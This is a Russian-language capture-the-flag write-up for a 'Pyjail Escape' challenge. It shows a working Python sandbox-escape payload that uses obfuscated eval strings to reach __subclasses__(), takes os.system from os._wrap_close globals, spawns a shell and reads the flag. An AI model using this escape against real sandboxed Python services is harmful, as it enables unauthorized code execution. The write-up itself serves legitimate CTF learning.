# Pyjail Escape (101 points, 67 solves)

> Python leave you must, to be master real!

Данный челлендж является продолжением [Pyjail ATricks](../Pyjail%20ATricks), поэтому я не буду повторять некоторые 
моменты.

Что же, из описания очевидно, что нам нужно как-то выйти из python тюрьмы. К этому моменту у меня уже было достаточно
знаний из изучения подобных задач. Очевидные попытки обратиться к `import`, `__import__`, `__builtins__` и подобным не
увенчались успехом. Тогда я дошёл до вывода всех доступных классов:

```python
>>> a = 1
# вводим 'a.__class__.__base__.__subclasses__()'
>>> a = eval("a.__class__.__"+eval("a.__doc__[27]")+"ase__.__s"+eval("a.__doc__[111]+a.__doc__[27]")+"classes__()")
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, 
<class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, 
<class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, 
<class 'dict_items'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, 
<class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>,
<class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, 
<class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, 
<class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, 
<class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, 
<class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, 
<class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, 
<class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, 
<class 'formatteriterator'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class 'moduledef'>, <class 'module'>, 
<class 'BaseException'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, 
<class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib._installed_safely'>, 
<class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, 
<class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, 
<class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, 
<class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, 
<class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, 
<class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, 
<class '_frozen_importlib_external.FileFinder'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, 
<class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, 
<class 'zipimport.zipimporter'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, 
<class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, 
<class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'abc.ABC'>, 
<class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, 
<class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, 
<class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_itemiterator'>, <class 'list_iterator'>, 
<class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, 
<class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, 
<class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, 
<class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>]
```

Из интересных замечаем `<class 'os._wrap_close'>`. Мы можем воспользоваться данным классом, чтобы обратиться к другим
функциям из модуля `os`, а если конкретнее, то к `system`. Делается это так (117 — индекс `<class 'os._wrap_close'>`):

```python
>>> a = 1
# 'a.__class__.__base__.__subclasses__()[117].__init__.__globals__["system"]("sh")'
>>> a = eval('eval("a.__class__.__"+eval("a.__doc__[27]")+"ase__.__s"+eval("a.__doc__[111]+a.__doc__[27]")+"classes__()")[117].__init__.__glo'+eval("a.__doc__[27]")+'als__["s'+eval("a.__doc__[312]")+'ste'+eval("a.__doc__[112]")+'"]("s'+eval("a.__doc__[270]")+'")')
# тут мы уже выбрались из тюрьмы
$ ls
LOS7Z9XYZU8YS89Q24PPHMMQFQ3Y7RIE.txt pyjail.py ynetd
$ cat *.txt
ALLES{th1s_w4s_a_r34l_3sc4pe}
```

Флаг наш!

*Примечание:* конечно же, я не удержался и прочитал [pyjail.py](../pyjail.py), ибо мне было интересно, как всё было 
устроено. Выкладываю этот файл для всех любопытных. 

Кстати, решив это задание, мы "бесплатно" получаем решение предыдущего. Меня удивил тот факт, что были люди, решившие это задание,
но не справившиеся с предыдущим. А ведь им всего лишь нужно было прочитать pyjail.py...